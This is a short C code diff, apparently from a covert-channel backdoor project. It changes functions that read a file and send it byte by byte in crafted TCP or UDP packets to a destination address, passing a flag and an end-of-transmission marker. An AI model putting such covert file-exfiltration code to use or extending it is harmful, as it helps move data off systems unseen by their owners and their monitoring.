@@ -49,7 +49,7 @@ void recv_results(char* sip, unsigned short sport, char* filename, bool tcp) {
 }
 
 //send file
-void send_results(char *sip, char *dip, unsigned short sport, unsigned short dport, char *filename, bool tcp) {
+void send_results(char *sip, char *dip, unsigned short sport, unsigned short dport, char *filename, bool tcp, int flag) {
     FILE *file;
     char input;
     clock_t start;
@@ -64,9 +64,9 @@ void send_results(char *sip, char *dip, unsigned short sport, unsigned short dpo
 
     while((input = fgetc(file)) != EOF) {
         if(tcp){
-            covert_send(sip, dip, sport, dport, (unsigned char *) &input, COMMAND); //send the packet
+            covert_send(sip, dip, sport, dport, (unsigned char *) &input, flag); //send the packet
         } else {
-            covert_udp_send(sip, dip, sport, dport, (unsigned char *) &input, COMMAND);
+            covert_udp_send(sip, dip, sport, dport, (unsigned char *) &input, flag);
         }
 
     }
@@ -87,13 +87,12 @@ int rand_delay(int delay) {
 }
 
 void covert_udp_send_data(char *sip, char *dip, unsigned short sport, unsigned short dport, char* data, int flag){
-    unsigned char *buf = 0;
 
     for(int i = 0; i<= (int)strlen(data); i++){
         covert_udp_send(sip,dip,sport,dport,(unsigned char*) &data[i], flag);
     }
     //end of file
-    covert_udp_send(sip,dip,sport,dport,buf, EOT);
+    covert_udp_send(sip,dip,sport,dport, (unsigned char*) &data[0], EOT);
 
 }
 
